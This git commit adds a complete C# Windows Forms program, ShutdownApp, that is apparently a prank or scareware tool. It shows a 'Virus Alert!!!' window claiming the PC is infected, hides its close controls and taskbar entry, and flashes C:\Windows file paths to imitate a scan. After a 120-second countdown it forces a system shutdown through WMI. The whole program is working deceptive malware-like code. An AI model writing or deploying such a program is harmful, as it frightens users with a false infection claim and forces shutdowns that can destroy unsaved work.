108474f91af7879fff16d10e7c76f6794f064f0b
fmir864 <fmir864@outlook.com>
2018-11-06 17:05:11 +0530

    Completed Solution.

---
+++ ShutdownApp/Shutdown.Designer.cs
@@ -0,0 +1,107 @@
+﻿namespace ShutdownApp
+{
+    partial class frmShutdown
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.bgwShutdownTimer = new System.ComponentModel.BackgroundWorker();
+            this.pbWait = new System.Windows.Forms.ProgressBar();
+            this.lblNote = new System.Windows.Forms.Label();
+            this.countdown = new System.Windows.Forms.Timer(this.components);
+            this.lblFile = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // bgwShutdownTimer
+            // 
+            this.bgwShutdownTimer.WorkerReportsProgress = true;
+            this.bgwShutdownTimer.DoWork += new System.ComponentModel.DoWorkEventHandler(this.bgwShutdownTimer_DoWork);
+            this.bgwShutdownTimer.ProgressChanged += new System.ComponentModel.ProgressChangedEventHandler(this.bgwShutdownTimer_ProgressChanged);
+            this.bgwShutdownTimer.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.bgwShutdownTimer_RunWorkerCompleted);
+            // 
+            // pbWait
+            // 
+            this.pbWait.Location = new System.Drawing.Point(12, 177);
+            this.pbWait.Name = "pbWait";
+            this.pbWait.Size = new System.Drawing.Size(260, 23);
+            this.pbWait.Style = System.Windows.Forms.ProgressBarStyle.Marquee;
+            this.pbWait.TabIndex = 0;
+            // 
+            // lblNote
+            // 
+            this.lblNote.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblNote.Location = new System.Drawing.Point(13, 13);
+            this.lblNote.Name = "lblNote";
+            this.lblNote.Size = new System.Drawing.Size(259, 105);
+            this.lblNote.TabIndex = 1;
+            this.lblNote.Text = "Your PC is been infected with virus and will be shutdown in {0} seconds";
+            this.lblNote.TextAlign = System.Drawing.ContentAlignment.TopCenter;
+            // 
+            // countdown
+            // 
+            this.countdown.Enabled = true;
+            this.countdown.Interval = 1000;
+            this.countdown.Tick += new System.EventHandler(this.countdown_Tick);
+            // 
+            // lblFile
+            // 
+            this.lblFile.Location = new System.Drawing.Point(12, 154);
+            this.lblFile.Name = "lblFile";
+            this.lblFile.Size = new System.Drawing.Size(260, 20);
+            this.lblFile.TabIndex = 2;
+            this.lblFile.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            // 
+            // frmShutdown
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(284, 212);
+            this.ControlBox = false;
+            this.Controls.Add(this.lblFile);
+            this.Controls.Add(this.lblNote);
+            this.Controls.Add(this.pbWait);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
+            this.Name = "frmShutdown";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Virus Alert!!!";
+            this.Load += new System.EventHandler(this.frmShutdown_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.ComponentModel.BackgroundWorker bgwShutdownTimer;
+        private System.Windows.Forms.ProgressBar pbWait;
+        private System.Windows.Forms.Label lblNote;
+        private System.Windows.Forms.Timer countdown;
+        private System.Windows.Forms.Label lblFile;
+    }
+}
+
---
+++ ShutdownApp/Shutdown.cs
@@ -0,0 +1,145 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.IO;
+using System.Linq;
+using System.Management;
+using System.Security.Permissions;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace ShutdownApp
+{
+    public partial class frmShutdown : Form
+    {
+        private int ticks = 0;
+        private bool flag = false;
+
+        private const int TimeOut = 120;
+        private const string Warning = "Your PC is been infected with virus and will be shutdown in {0} seconds";
+
+        public frmShutdown()
+        {
+            InitializeComponent();
+        }
+
+        private void Shutdown()
+        {
+            ManagementBaseObject mboShutdown = null;
+            ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");
+            mcWin32.Get();
+
+            // You can't shutdown without security privileges
+            mcWin32.Scope.Options.EnablePrivileges = true;
+            ManagementBaseObject mboShutdownParams =
+                     mcWin32.GetMethodParameters("Win32Shutdown");
+
+            // Flag 1 means we want to shut down the system. Use "2" to reboot.
+            mboShutdownParams["Flags"] = "1";
+            mboShutdownParams["Reserved"] = "0";
+            foreach (ManagementObject manObj in mcWin32.GetInstances())
+            {
+                mboShutdown = manObj.InvokeMethod("Win32Shutdown",
+                                               mboShutdownParams, null);
+            }
+        }
+
+        private IEnumerable<string> Traverse(string path)
+        {
+            IEnumerable<string> files = Enumerable.Empty<string>();
+            IEnumerable<string> directories = Enumerable.Empty<string>();
+            try
+            {
+                // The test for UnauthorizedAccessException.
+                var permission = new FileIOPermission(FileIOPermissionAccess.PathDiscovery, path);
+                permission.Demand();
+
+                files = Directory.GetFiles(path);
+                directories = Directory.GetDirectories(path);
+            }
+            catch
+            {
+                // Ignore folder (access denied).
+                path = null;
+            }
+
+            if (path != null)
+                yield return path;
+
+            foreach (var file in files)
+            {
+                yield return file;
+            }
+
+            // Recursive call for SelectMany.
+            var subdirectoryItems = directories.SelectMany(Traverse);
+            foreach (var result in subdirectoryItems)
+            {
+                yield return result;
+            }
+        }
+
+        private void countdown_Tick(object sender, EventArgs e)
+        {
+            if (flag)
+            {
+                countdown.Stop();
+
+                Shutdown();
+
+                this.Close();
+                return;
+            }
+
+            ticks++;
+            flag = ticks.Equals(TimeOut);
+            bgwShutdownTimer.ReportProgress(ticks);
+        }
+
+        private void frmShutdown_Load(object sender, EventArgs e)
+        {
+            pbWait.Maximum = TimeOut;
+            lblNote.Text = string.Format(Warning, Convert.ToString(TimeOut));
+
+            bgwShutdownTimer.RunWorkerAsync();
+        }
+
+        private void bgwShutdownTimer_DoWork(object sender, DoWorkEventArgs e)
+        {
+            countdown.Start();
+
+            try
+            {
+                List<string> files = Traverse("C:\\Windows").ToList();
+                for (int i = 0; i < files.Count; i++)
+                {
+                    if (flag) break;
+                    if ((i % 300).Equals(0)) Thread.Sleep(500);
+
+                    this.Invoke((MethodInvoker)delegate() { lblFile.Text = files[i]; });
+                }
+            }
+            catch { }
+
+            while (!flag)
+            {
+                //wait
+            }
+
+            countdown.Stop();
+        }
+
+        private void bgwShutdownTimer_ProgressChanged(object sender, ProgressChangedEventArgs e)
+        {
+            pbWait.Value = e.ProgressPercentage;
+            lblNote.Text = string.Format(Warning, Convert.ToString(TimeOut - e.ProgressPercentage));
+        }
+
+        private void bgwShutdownTimer_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
+        {
+            Shutdown();
+
+            this.Close();
+        }
+    }
+}
